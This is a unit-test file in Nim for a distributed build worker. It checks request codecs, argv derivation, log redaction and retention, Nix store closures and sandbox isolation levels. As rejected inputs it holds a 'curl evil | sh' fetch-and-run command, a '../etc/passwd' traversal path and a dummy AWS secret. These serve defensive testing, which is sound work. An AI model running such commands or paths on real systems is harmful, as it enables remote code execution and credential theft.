## Library-local tests for `repro_distributed_worker` (Distributed-Execution
## M7).
##
##   * the `ReachGoal` codec round-trips and refuses trailing bytes, and
##     `checkDerivation` refuses every claim the hydrated descriptor and the
##     verified snapshot do not support (an argv the caller composed, an
##     unknown node, an input outside the snapshot or not declared, a
##     descriptor bound to another tree) while accepting the honest one;
##   * the certificate signer's request codec round-trips and refuses
##     content that is not a `git-tree-sha1` id (threat model D5);
##   * `readCapped` reads at most its cap, from the END of the file — a
##     lease that writes gigabytes costs the daemon the cap (G31) — and
##     `parseReportLine` reads every report kind the supervisor writes,
##     including the folded-flood summary (G21);
##   * the closure helpers: `nixStoreEntryOf`, and `computeLeaseClosure`
##     returns store paths, never the whole of `/nix/store` (G25);
##   * a declared IMPURE (fixed-output) action's descriptor rules: outputs
##     required, every output carrying exactly one fixed digest, no digest
##     for an undeclared output, fixed digests only on an impure node — with
##     the valid impure node as the positive control (review fix);
##   * INPUT NODES and input artifacts: the descriptor names only existing,
##     distinct, other nodes; a request's input artifact must be a declared
##     output of a declared input node of the goal node (review fix);
##   * which detections withhold a certificate in each profile
##     (`blocksCertificate`) and the isolation-level order a requester's
##     minimum is judged by (`isolationSatisfies`: a set comparison —
##     `linux-namespace+floor` does not satisfy `+landlock`);
##   * EVID-6 for the trusted profile's local stores: a local log line
##     carries only allow-listed fields and no payload, the file is
##     owner-only, it is rotated by size and by age and its old generations
##     deleted (`appendLocalLog`, `sweepLocalLog`); execution records past
##     their retention are deleted from the store (`sweepExecutionRecords`),
##     and a record listed while a sweep runs survives its index rewrite.
##
## MOCK POLICY — none: pure functions over real bytes; the closure test asks
## the host's real `nix-store`.

import std/[os, osproc, sets, strutils, tempfiles, times, unittest]

import repro_workspace_snapshot
import repro_distributed_worker
import repro_peer_cache/evidence_record

proc localLogText(path: string): string =
  if fileExists(path): readFile(path) else: ""

proc evid6LocalLog(): bool =
  ## EVID-6 for a trusted node's local detection/audit logs. True once
  ## every step ran (each step `check`s its own property).
  let dir = createTempDir("m7-evid6-log-", "")
  defer: removeDir(dir)
  let path = dir / "detections.log"
  # REDACTION, AS AN ALLOW-LIST: fields nobody listed are dropped, listed
  # ones truncated, and no payload byte is written.
  let longReason = repeat('x', MaxFieldValueBytes + 500)
  let rec = newEvidenceRecord(ecDetection, "goal-receiver",
    "goal-schema-invalid",
    [("peer", "orch-host"), ("reason", longReason),
     ("env", "AWS_SECRET_ACCESS_KEY=hunter2"),
     ("body", "int main(void) { return UNCOMMITTED; }"),
     ("snapshotFile", "src/secret.c")],
    payload = toOpenArrayByte("payload-bytes-of-a-source-file", 0, 29))
  appendLocalLog(path, localLogEntry(rec), nowS = 1_000)
  let text = localLogText(path)
  check text.startsWith("1000 detection goal-receiver goal-schema-invalid ")
  check "peer=orch-host" in text
  check "hunter2" notin text and "env=" notin text
  check "UNCOMMITTED" notin text and "body=" notin text
  check "snapshotFile" notin text
  check "payload-bytes" notin text
  check repeat('x', MaxFieldValueBytes) in text
  check repeat('x', MaxFieldValueBytes + 1) notin text
  # READERS: owner-only, and an existing wider file is narrowed on append.
  when defined(posix):
    check getFilePermissions(path) == {fpUserRead, fpUserWrite}
    let wide = dir / "audit.log"
    writeFile(wide, "")
    setFilePermissions(wide, {fpUserRead, fpUserWrite, fpGroupRead,
      fpOthersRead})
    appendLocalLog(wide, "audit boundary-gate mkFetch", nowS = 1_000)
    check getFilePermissions(wide) == {fpUserRead, fpUserWrite}
  # RETENTION: rotation by size — at most `generations` old files.
  let sized = LocalLogPolicy(maxBytes: 200, rotateAfterSeconds: 86_400,
    generations: 3, retentionSeconds: LocalLogRetentionSeconds)
  let small = dir / "sized.log"
  for i in 0 ..< 20:
    appendLocalLog(small, "detection lease-supervisor fs-denied path=/p" &
      $i & repeat('.', 30), sized, nowS = 2_000)
  check fileExists(small & ".1")
  check fileExists(small & ".3")
  check not fileExists(small & ".4")
  check getFileSize(small) <= 200
  check "/p19" in localLogText(small)          # the newest entry is active
  check "/p0." notin localLogText(small) & localLogText(small & ".1") &
    localLogText(small & ".2") & localLogText(small & ".3")  # oldest gone
  # Rotation by age, without a new entry: the active file's first entry is
  # older than `rotateAfterSeconds`.
  let aged = LocalLogPolicy(maxBytes: 1_000_000, rotateAfterSeconds: 100,
    generations: 3, retentionSeconds: LocalLogRetentionSeconds)
  let quiet = dir / "quiet.log"
  appendLocalLog(quiet, "detection goal-receiver goal-argv-not-derivable",
    aged, nowS = 5_000)
  check sweepLocalLog(quiet, aged, nowS = 5_050) == 0
  check fileExists(quiet) and not fileExists(quiet & ".1")
  discard sweepLocalLog(quiet, aged, nowS = 5_101)
  check not fileExists(quiet)
  check fileExists(quiet & ".1")
  # Deletion: a rotated file whose newest entry is past retention goes.
  let now = getTime().toUnix
  let keep = LocalLogPolicy(maxBytes: 1_000_000, rotateAfterSeconds: 86_400,
    generations: 4, retentionSeconds: 1_000)
  let old = dir / "old.log"
  writeFile(old & ".1", "1 detection x y\n")
  writeFile(old & ".2", "1 detection x y\n")
  setLastModificationTime(old & ".2", fromUnix(now - 2_000))
  check sweepLocalLog(old, keep, nowS = now) == 1
  check fileExists(old & ".1")                 # inside retention: kept
  check not fileExists(old & ".2")             # past it: deleted
  true

proc evid6RecordSweep(): bool =
  ## EVID-6 for execution records: listed when stored, deleted from the
  ## store once past retention. True once every step ran.
  let dir = createTempDir("m7-evid6-rec-", "")
  defer: removeDir(dir)
  let index = dir / "execution-records.index"
  var d1, d2: array[32, byte]
  d1[0] = 1
  d2[0] = 2
  appendRecordIndex(index, d1, nowS = 1_000)
  appendRecordIndex(index, d2, nowS = 5_000)
  when defined(posix):
    check getFilePermissions(index) == {fpUserRead, fpUserWrite}
  var failing = proc(d: array[32, byte]): bool {.gcsafe, closure.} = false
  # A deletion that fails keeps the record listed for the next sweep.
  check sweepExecutionRecords(index, failing, retentionSeconds = 2_000,
    nowS = 4_000) == 0
  check recordHex(d1) in readFile(index)
  var deleted = newSeq[string]()
  let store = proc(d: array[32, byte]): bool {.gcsafe, closure.} =
    {.cast(gcsafe).}:
      deleted.add(recordHex(d))
    true
  check sweepExecutionRecords(index, store, retentionSeconds = 2_000,
    nowS = 4_000) == 1
  check deleted == @[recordHex(d1)]
  check recordHex(d1) notin readFile(index)
  check recordHex(d2) in readFile(index)       # inside retention: kept
  when defined(posix):
    check getFilePermissions(index) == {fpUserRead, fpUserWrite}
  check sweepExecutionRecords(index, store, retentionSeconds = 2_000,
    nowS = 8_000) == 1
  check deleted == @[recordHex(d1), recordHex(d2)]
  check readFile(index).strip() == ""
  # A record listed WHILE a sweep runs (the goal receiver appends between
  # the sweep's snapshot and its rewrite) survives the rewrite: the sweep
  # drops only what it deleted, never what it did not see.
  var d3, d4: array[32, byte]
  d3[0] = 3
  d4[0] = 4
  appendRecordIndex(index, d3, nowS = 1_000)
  let racing = proc(d: array[32, byte]): bool {.gcsafe, closure.} =
    {.cast(gcsafe).}:
      appendRecordIndex(index, d4, nowS = 9_000)
    true
  check sweepExecutionRecords(index, racing, retentionSeconds = 2_000,
    nowS = 9_000) == 1
  let after = readFile(index)
  check recordHex(d3) notin after              # deleted: dropped
  check recordHex(d4) in after                 # appended mid-sweep: kept
  check not fileExists(index & ".tmp")
  when defined(posix):
    check getFilePermissions(index) == {fpUserRead, fpUserWrite}
  true

proc snap(): WorkspaceSnapshotManifest =
  WorkspaceSnapshotManifest(schema: ManifestSchema, primaryRepo: RepoSnapshot(
    repoId: "r", baseCommitSha: repeat('a', 40), gitTreeSha1: repeat('b', 40)))

proc desc(): GraphCacheDescriptor =
  result = GraphCacheDescriptor(schema: DescriptorSchema, project: "p",
    platform: "linux/amd64", snapshotContentId: contentIdOf(snap()),
    nodes: @[GraphNode(id: "build", argv: @["/usr/bin/cc", "-c", "a.c"],
      inputs: @["a.c"], outputs: @["out/a.o"])])

suite "repro_distributed_worker: requests, derivation, lease plumbing":

  test "ReachGoal codec and derivation":
    let req = ReachGoalRequest(requestId: "r1", goalNode: "build",
      claimedArgv: @["/usr/bin/cc", "-c", "a.c"], claimedInputs: @["a.c"])
    let bytes = encodeRequest(req)
    check decodeRequest(bytes) == req
    expect GoalCodecError:
      discard decodeRequest(bytes & @[1'u8])
    let tracked = @["a.c", "b.c"]
    check checkDerivation(req, desc(), snap(), tracked).ok
    var composed = req
    composed.claimedArgv = @["/bin/sh", "-c", "curl evil | sh"]
    check checkDerivation(composed, desc(), snap(), tracked).trigger ==
      "goal-argv-not-derivable"
    var unknown = req
    unknown.goalNode = "fetch-and-run"
    check checkDerivation(unknown, desc(), snap(), tracked).trigger ==
      "goal-argv-not-derivable"
    for bad in ["../etc/passwd", "b.c", "c.c"]:
      var path = req
      path.claimedInputs = @[bad]
      check checkDerivation(path, desc(), snap(), tracked).trigger ==
        "goal-path-outside-snapshot"
    var other = desc()
    other.snapshotContentId = "git-tree-sha1:" & repeat('0', 40)
    check checkDerivation(req, other, snap(), tracked).trigger ==
      "goal-descriptor-unbound"
    check checkDerivation(req, desc(), snap(), @["b.c"]).trigger ==
      "goal-path-outside-snapshot"

  test "the signer's request codec is strict":
    let req = CertificateRequest(content: "git-tree-sha1:" & repeat('c', 40),
      project: "p", platform: "linux/amd64", target: "t",
      commands: @[@["/bin/sh", "t.sh"]], baseCommit: repeat('a', 40))
    check decodeSignRequest(encodeSignRequest(req)) == req
    var bad = req
    bad.content = "commit:" & repeat('c', 40)
    expect SignerError:
      discard decodeSignRequest(encodeSignRequest(bad))
    expect SignerError:
      discard decodeSignRequest(encodeSignRequest(req) & @[0'u8])

  test "element-count bounds admit the tightest valid payloads at their caps":
    # Each list on its own, every element at its smallest encoding (empty
    # strings, zero digests) and at (or near) the decoder's cap, with
    # nothing after it but the fixed tail: the per-element minimum a
    # decoder bounds that count by must be a true lower bound, so these
    # valid payloads decode unchanged. (One byte more in any minimum would
    # refuse them: the lists dwarf their tails.)
    var d = GraphCacheDescriptor(nodes: newSeq[GraphNode](2_000))
    check decodeDescriptor(encodeDescriptor(d)) == d
    d = GraphCacheDescriptor(nodes: @[GraphNode(
      env: newSeq[(string, string)](MaxEnv))])
    check decodeDescriptor(encodeDescriptor(d)) == d
    d = GraphCacheDescriptor(nodes: @[GraphNode(
      fixedOutputs: newSeq[(string, array[32, byte])](2_000))])
    check decodeDescriptor(encodeDescriptor(d)) == d
    for req in [ReachGoalRequest(claimedArgv: newSeq[string](MaxArgs)),
                ReachGoalRequest(claimedInputs: newSeq[string](MaxClaims)),
                ReachGoalRequest(
                  inputArtifacts: newSeq[InputArtifact](MaxClaims))]:
      check decodeRequest(encodeRequest(req)) == req
    let resp = ReachGoalResponse(outputs: newSeq[GoalOutput](MaxOutputs))
    check decodeResponse(encodeResponse(resp)) == resp
    var sreq = CertificateRequest(content: "git-tree-sha1:" &
      repeat('c', 40), commands: newSeq[seq[string]](64))
    check decodeSignRequest(encodeSignRequest(sreq)) == sreq
    sreq.commands = @[newSeq[string](1024)]
    check decodeSignRequest(encodeSignRequest(sreq)) == sreq
    for m in [
        WorkspaceSnapshotManifest(primaryRepo: RepoSnapshot(
          modified: newSeq[ModifiedFileEntry](5_000))),
        WorkspaceSnapshotManifest(primaryRepo: RepoSnapshot(
          deleted: newSeq[string](5_000))),
        WorkspaceSnapshotManifest(
          developSiblings: newSeq[RepoSnapshot](MaxSiblings))]:
      check decodeManifest(encodeManifest(m)) == m
    var fields: seq[(string, string)] = @[]
    for _ in 0 ..< MaxFields: fields.add(("", ""))
    let ev = newEvidenceRecord(ecDetection, "", "", fields)
    let evBack = decodeEvidenceRecord(encodeEvidenceRecord(ev))
    check evBack.fields.len == MaxFields
    check encodeEvidenceRecord(evBack) == encodeEvidenceRecord(ev)
    # A count the remaining bytes cannot hold is refused by the bound,
    # before anything is sized by it: the output count follows the 4-byte
    # magic, the u16 version, the empty id, the status byte, two empty
    # strings and the exit code.
    var forged = encodeResponse(ReachGoalResponse(
      outputs: newSeq[GoalOutput](1)))
    let at = 4 + 2 + 4 + 1 + 4 + 4 + 4
    check forged[at] == 1
    forged[at] = byte(1_000 and 0xff)
    forged[at + 1] = byte(1_000 shr 8)
    var refusal = ""
    try:
      discard decodeResponse(forged)
    except GoalCodecError as e:
      refusal = e.msg
    check "element count exceeds remaining bytes" in refusal

  test "capped reads take the tail, report lines parse":
    let dir = createTempDir("m7-lease-", "")
    defer: removeDir(dir)
    let big = dir / "stdout"
    var f = open(big, fmWrite)
    for i in 0 ..< 3 * 1024:
      f.write(repeat('a', 1023) & "\n")
    f.write("THE-END\n")
    f.close()
    let got = readCapped(big, 4096)
    check got.len == 4096
    check got.endsWith("THE-END\n")
    check readCapped(dir / "absent") == ""
    let line = """{"kind":"syscall-denied","detail":"keyctl","syscall":"keyctl","pid":7}"""
    let parsed = parseReportLine(line)
    check parsed.ok
    check parsed.report.kind == "syscall-denied"
    check parsed.report.detail == "keyctl"
    check parsed.report.pid == 7
    let flood = parseReportLine("""{"kind":"reports-suppressed","detail":"fs-denied","count":41,"syscall":"","pid":0}""")
    check flood.ok
    check flood.report.count == 41
    check not parseReportLine("not json").ok

  test "the closure is store paths, never all of /nix/store":
    check nixStoreEntryOf("/nix/store/abc-gcc-13/bin/cc") == "/nix/store/abc-gcc-13"
    check nixStoreEntryOf("/usr/bin/cc") == ""
    # Only PATH entries whose store path still exists and is VALID: a
    # long-lived shell's PATH can name store paths the Nix GC has since
    # collected, and `computeLeaseClosure` (correctly) fails closed on
    # those — the production behaviour is not what this case is about.
    var storeDirs: seq[string] = @[]
    # Not resolved through symlinks: `nix-store` is a link to the multi-call
    # `nix` binary, which picks its mode from the name it was invoked by.
    let nixStore = findExe("nix-store", followSymlinks = false)
    for dir in getEnv("PATH").split(PathSep):
      let entry = nixStoreEntryOf(dir)
      if entry.len == 0 or not dirExists(dir) or nixStore.len == 0:
        continue
      let valid = execCmdEx(quoteShellCommand([nixStore, "--check-validity",
        entry]))
      if valid.exitCode == 0:
        storeDirs.add(dir)
      else:
        checkpoint("skipping a collected/invalid PATH store entry: " & entry &
          " (" & valid.output.strip() & ")")
    if storeDirs.len == 0 or nixStore.len == 0:
      checkpoint("no Nix store toolchain on PATH: the store half is not exercised")
      let c = computeLeaseClosure(@[], getAppFilename(), @["/usr/bin"])
      check c.ok
      check c.roots.len > 0 and c.roots[0] == "/usr/bin"
      # (On nix-darwin/NixOS the system closure follows; never the store.)
      check "/nix/store" notin c.roots
      check "/nix/store/" notin c.roots
    else:
      let c = computeLeaseClosure(storeDirs, getAppFilename(), @["/usr/bin"])
      checkpoint("closure: " & $c.roots.len & " roots; " & c.reason)
      check c.ok
      check "/nix/store" notin c.roots
      check "/nix/store/" notin c.roots
      for r in c.roots:
        if r != "/usr/bin":
          check nixStoreEntryOf(r) == r
      for d in storeDirs:
        check nixStoreEntryOf(d) in c.roots

  test "a declared impure action's descriptor rules":
    var d0: array[32, byte]
    var d1: array[32, byte]
    d1[0] = 1
    proc withNode(n: GraphNode): GraphCacheDescriptor =
      result = desc()
      result.nodes.add(n)
      result.sortNodes()
    let good = GraphNode(id: "fetch", argv: @["/bin/sh", "f.sh"],
      outputs: @["out/a", "out/b"], impure: true,
      fixedOutputs: @[("out/a", d0), ("out/b", d1)])
    check validateDescriptor(withNode(good)) == ""          # positive control
    check decodeDescriptor(encodeDescriptor(withNode(good))) == withNode(good)
    var noOutputs = good
    noOutputs.outputs = @[]
    noOutputs.fixedOutputs = @[]
    check "must declare outputs" in validateDescriptor(withNode(noOutputs))
    var unfixed = good
    unfixed.fixedOutputs = @[("out/a", d0)]
    check "has no fixed digest" in validateDescriptor(withNode(unfixed))
    var dup = good
    dup.fixedOutputs = @[("out/a", d0), ("out/a", d1)]
    check "duplicate fixed output" in validateDescriptor(withNode(dup))
    var extra = good
    extra.fixedOutputs = @[("out/a", d0), ("out/b", d1), ("out/c", d1)]
    check "undeclared output" in validateDescriptor(withNode(extra))
    var pure = good
    pure.impure = false
    check "only by an impure action" in validateDescriptor(withNode(pure))

  test "input nodes and input artifacts are derived from the descriptor":
    var d = desc()
    d.nodes.add(GraphNode(id: "test", argv: @["/bin/sh", "t.sh"],
      outputs: @["out/t.ok"], inputNodes: @["build"], isTest: true))
    d.sortNodes()
    check validateDescriptor(d) == ""                         # positive control
    check decodeDescriptor(encodeDescriptor(d)) == d
    var selfDep = d
    selfDep.nodes[selfDep.findNode("test")].inputNodes = @["test"]
    check "its own input node" in validateDescriptor(selfDep)
    var missing = d
    missing.nodes[missing.findNode("test")].inputNodes = @["nowhere"]
    check "not in the descriptor" in validateDescriptor(missing)
    var twice = d
    twice.nodes[twice.findNode("test")].inputNodes = @["build", "build"]
    check "duplicate input node" in validateDescriptor(twice)
    # An input node's id becomes a directory name: never a path.
    var escaping = d
    escaping.nodes.add(GraphNode(id: "../escape", argv: @["/bin/true"]))
    escaping.sortNodes()
    escaping.nodes[escaping.findNode("test")].inputNodes = @["../escape"]
    check "not a plain name" in validateDescriptor(escaping)
    var digest: array[32, byte]
    digest[3] = 7
    let req = ReachGoalRequest(requestId: "t1", goalNode: "test",
      inputArtifacts: @[InputArtifact(node: "build", path: "out/a.o",
        digest: digest)])
    check decodeRequest(encodeRequest(req)) == req
    let tracked = @["a.c", "t.sh"]
    check checkDerivation(req, d, snap(), tracked).ok        # positive control
    var notInput = req
    notInput.goalNode = "build"
    check checkDerivation(notInput, d, snap(), tracked).trigger ==
      "goal-path-outside-snapshot"
    var notOutput = req
    notOutput.inputArtifacts[0].path = "a.c"
    check checkDerivation(notOutput, d, snap(), tracked).trigger ==
      "goal-path-outside-snapshot"
    var doubled = req
    doubled.inputArtifacts.add(req.inputArtifacts[0])
    check checkDerivation(doubled, d, snap(), tracked).trigger ==
      "goal-path-outside-snapshot"

  test "what withholds a certificate, per profile; isolation-level sets":
    # TRUSTED: only the plan's DET triggers (and a folded flood of one).
    for t in ["blob-digest-mismatch", "selector-validation-failed",
              "goal-path-outside-snapshot", "exec-outside-closure",
              "certificate-tree-mismatch", "mark-suspect"]:
      check blocksCertificate(t, "", hardened = false)
    for t in ["fs-denied", "egress-denied", "syscall-denied",
              "unix-socket-connect"]:
      check not blocksCertificate(t, "/Users/b/.cache", hardened = false)
      check blocksCertificate(t, "", hardened = true)      # hardened: all
    check blocksCertificate("reports-suppressed", "exec-outside-closure",
      hardened = false)
    check not blocksCertificate("reports-suppressed", "fs-denied",
      hardened = false)
    # A requester's minimum is a SET comparison (required layers must have
    # run), not a count of layers.
    check isolationSatisfies("linux-namespace+landlock+floor", "")
    check isolationSatisfies("linux-namespace+landlock+floor",
      "linux-namespace")
    check isolationSatisfies("linux-namespace+landlock+floor",
      "linux-namespace+floor+landlock")                   # order-free
    check isolationSatisfies("linux-namespace+landlock+floor+memfd-noexec",
      "linux-namespace+landlock+floor")
    check not isolationSatisfies("linux-namespace+landlock+floor",
      "linux-namespace+landlock+floor+memfd-noexec")
    check not isolationSatisfies("linux-namespace", "linux-namespace+landlock")
    # Two layers are not one other layer: `+floor` (and `+memfd-noexec`)
    # does not stand in for `+landlock`, however many there are.
    check not isolationSatisfies("linux-namespace+floor", "linux-namespace+landlock")
    check not isolationSatisfies("linux-namespace+floor+memfd-noexec",
      "linux-namespace+landlock")
    # Duplicates collapse: a repeated layer counts once, and still is not
    # the missing one.
    check not isolationSatisfies("linux-namespace+floor+floor+floor",
      "linux-namespace+landlock")
    check parseIsolationLevel("linux-namespace+floor+floor").layers == @["floor"]
    # Bases: windows-job < macos-seatbelt < linux-namespace.
    check isolationSatisfies("linux-namespace", "macos-seatbelt")
    check isolationSatisfies("macos-seatbelt", "windows-job")
    check not isolationSatisfies("macos-seatbelt", "linux-namespace")
    check not isolationSatisfies("windows-job", "macos-seatbelt")
    check not isolationSatisfies("macos-seatbelt", "linux-namespace+landlock")
    # Unknown or partial levels satisfy nothing; an unknown requirement is
    # met by nothing (fail closed).
    check not isolationSatisfies("linux-partial[landlock,floor]", "windows-job")
    check not isolationSatisfies("", "windows-job")
    check not isolationSatisfies("linux-namespace+landlock+floor",
      "linux-namespace+vm")
    check not isolationSatisfies("linux-namespace+landlock+floor", "bogus")
    when defined(linux):
      check isolationLevelOf(LeaseSpec(layers: DefaultLeaseLayers)) ==
        "linux-namespace+landlock+floor"
      check isolationLevelOf(LeaseSpec(layers: {llNamespace})) == "linux-namespace"
    elif defined(macosx):
      check isolationLevelOf(LeaseSpec(layers: DefaultLeaseLayers)) == "macos-seatbelt"

  test "EVID-6 (trusted local stores): a local log is allow-listed, owner-only, rotated and deleted":
    check evid6LocalLog()

  test "EVID-6 (trusted local stores): execution records past retention are deleted":
    check evid6RecordSweep()
